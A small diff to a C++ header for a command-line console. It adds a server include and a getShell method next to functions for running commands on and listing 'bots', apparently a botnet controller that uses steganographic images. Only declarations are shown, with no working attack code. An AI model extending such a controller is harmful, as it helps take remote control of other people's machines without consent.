@@ -6,6 +6,7 @@
 #include <sstream>
 #include <string>
 #include "stegImage.h"
+#include "server.h"
 #include <iostream>
 
 extern std::map<int,std::string> bots;
@@ -18,6 +19,7 @@ private:
     static void setAttr(cli *cliInstance);
     static void showInfo(cli *cliInstance);
     static void runCommand(cli *cliInstance);
+    static void getShell(cli *cliInstance);
     static void showBots(cli *cliInstance);
     typedef void (*cliFunct)(cli *cliInstance); //Function pointer type for CLI interfac
     int parseCommand (std::string command);
